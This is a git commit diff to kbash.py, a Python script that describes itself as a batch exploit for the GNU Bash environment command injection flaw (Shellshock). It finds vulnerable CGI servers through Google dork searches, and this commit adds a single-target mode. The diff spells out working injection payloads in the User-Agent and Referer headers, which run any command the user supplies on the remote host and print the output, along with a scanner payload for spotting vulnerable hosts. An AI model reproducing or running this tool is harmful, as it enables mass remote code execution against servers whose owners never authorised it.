a5285c6662804c7f26d03a54a43baf9a3e85a28e
KingX <kingx2013@gmail.com>
2014-09-26 16:56:55 +0800

    add support for single target
    add command execute response support

--- kbash.py
+++ kbash.py
@@ -11,37 +11,43 @@ class Exploit(threading.Thread):
 		threading.Thread.__init__(self)
 
 	def run(self):
-		while not self.google.dead:
-			while not self.targets.empty(): 
-				url = self.targets.get()
-				try:
-					if self.cmd is not None and len(self.cmd)>0:
-						headers = {"User-Agent":"() { :; }; " + self.cmd}
-					else:
-						headers = {"User-Agent" : '() { 1;}; echo -e "header\x3akbash-scaned2"'}
-					#print headers
+		while not self.targets.empty(): 
+			url = self.targets.get()
+			try:
+				if self.cmd is not None and len(self.cmd)>0:
+					headers = {"Referer":'() { 1;}; echo "Content-type: text/plain"; echo; echo; '+self.cmd}
 					r = requests.get(url, headers = headers, verify = False, timeout = 10)
+					print "[ Reponse Code ] "+str(r.status_code)
+					print "[ Response Header ]"
+					print r.headers
+					print r.content
+				else:
+					headers = {"User-Agent" : '() { 1;}; echo -e "header\x3akbash-scaned2"'}
+					r = requests.get(url, headers = headers, verify = False, timeout = 10)
+					#print r.headers
 					if 'header' in r.headers and 'kbash-scaned' in r.headers['header']:
 						print "[ FIND vulnerable ] " + url
 					else:
 						print "[ no vulnerable ] " + url[:50]
-					#print str(r.status_code) + " : " + url
-				except Exception as e:
-					print "[ ERROR ]" + str(e) + " " +url 
-				finally:
-					self.targets.task_done()
-
+				#print headers
 				
-			time.sleep(0.1)
-		print "[ DEBUG ] " + self.getName() + " done"
+					#pass
+				#print str(r.status_code) + " : " + url
+			except Exception as e:
+				print "[ ERROR ]" + str(e) + " " + url 
+			finally:
+				self.targets.task_done()
 
-class Google(threading.Thread):
-	def __init__(self, dork, count):
+		#print "[ DEBUG ] " + self.getName() + " done"
+
+class Payload(threading.Thread):
+	def __init__(self, dork="", count=0, mode="google"):
 		self.dork = dork
+		self.mode = mode
 		self.count = count
 		self.targets = Queue.Queue()
 		self.launch = False
-		self.dead = False
+		self.search_complete = False
 		threading.Thread.__init__(self)
 
 	def run(self):
@@ -57,11 +63,11 @@ class Google(threading.Thread):
 			print "Cant Connect to Google!"
 		finally:
 			self.launch = True
-			self.dead = True			
+			self.search_complete = True			
 		print "Google Search Done"
 
 	def google(self, dork, index):
-		url = 'https://www.google.com/search?q='+urllib2.quote(dork)+'&_'+str(random.random())+'&start='+str(index);
+		url = 'https://www.google.com/search?q='+urllib2.quote(dork)+'&_'+str(random.random())+'$cr=countryCN&start='+str(index);
 		
 		#userAgent = 'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.41 Safari/537.36';
 		#headers = {"User-Agent":userAgent}
@@ -80,10 +86,15 @@ class Google(threading.Thread):
 
 
 
-USAGE = "python kbash.py [-t thread -c page_count -e command -d dork -p proxy]"
-DESC  = "Batch Exploit GNU Bash Env Command Injection base on Google. Version 2.0 \n code by kingx  -   http://cih.so"
+USAGE = "python kbash.py [-u single_target -d google_dork -t thread -c page_count -e command  -p proxy]"
+DESC  = "Batch Exploit GNU Bash Env Command Injection base on Google. Version 2.1 \n code by kingx  -   http://cih.so"
 epilog = "License, requests, etc: https://github.com/KxCode"
 parser = argparse.ArgumentParser(usage=USAGE, description=DESC, epilog=epilog)
+parser.add_argument('-u', dest='url',
+                    help="specific a single Target Url")
+parser.add_argument('-d', dest='dork',
+                    help="Custom Google Dork,Using Google Search to find targets",
+                    default="filetype:sh inurl:cgi")
 parser.add_argument('-t', dest='thread_count',
 					type=int,
                     help="thread count",
@@ -92,9 +103,6 @@ parser.add_argument('-c', dest='page_count',
 					type=int,
                     help="crawl google page count",
                     default=1)
-parser.add_argument('-d', dest='dork',
-                    help="Custom Google Dork",
-                    default="filetype:sh inurl:cgi")
 parser.add_argument('-e', dest='cmd',
                     help="Command to Execute",
                     default="")
@@ -129,22 +137,30 @@ if args.proxy:
 		print e
 #PROXY CODE END
 
-dork = args.dork
-print "[ DORK ]\t"+dork
 print "[ THREAD ]\t"+str(args.thread_count)
 print "[ PAGE ]\t"+str(args.page_count)
 
-google = Google(dork, args.page_count)
-print "Google Searching..."
-google.start()
+dork = args.dork
 
 
-while not google.launch:
+if "url" in args:
+	print "[ ATTACK ] " + args.url
+	print "[ Tips ] you should specific the absolute path for the command to execute"
+	payload = Payload(mode="single")
+	payload.targets.put(args.url)
+	payload.launch = True
+else:
+	payload = Payload(dork, args.page_count)
+	print "Using Google Search."
+	print "[ DORK ]\t"+dork
+	payload.start()
+
+while not payload.launch:
 	time.sleep(0.1)
 
 pool = []
 for i in range(0,args.thread_count):
-	exp = Exploit(google, args.cmd)
+	exp = Exploit(payload, args.cmd)
 	pool.append(exp)
 	exp.daemon = True
 	exp.start()
